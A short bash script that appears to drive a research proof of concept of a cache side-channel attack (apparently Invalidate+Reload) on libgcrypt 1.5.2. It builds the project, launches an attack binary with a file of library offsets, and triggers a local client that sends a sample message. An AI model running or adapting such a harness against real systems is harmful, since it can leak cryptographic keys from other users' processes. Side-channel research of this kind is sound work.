#!/bin/bash

make clean
make

DEFAULT=${HOME}/INV-RELOAD
LIBGCRYPT=/usr/local/lib/libgcrypt.so.11
OFFSET=${DEFAULT}/doc/offset-libgcrypt-1.5.2.txt
CYCLE=$1

./attack ${LIBGCRYPT} ${OFFSET} ${CYCLE} &
ATTACK_PID=$!

sleep 0.001

./client -i 127.0.0.1 -m sample_message
CLIENT_PID=$!

trap "kill -TERM ${ATTACK_PID} ${CLIENT_PID}" INT QUIT

wait ${ATTACK_PID}
wait ${CLIENT_PID}
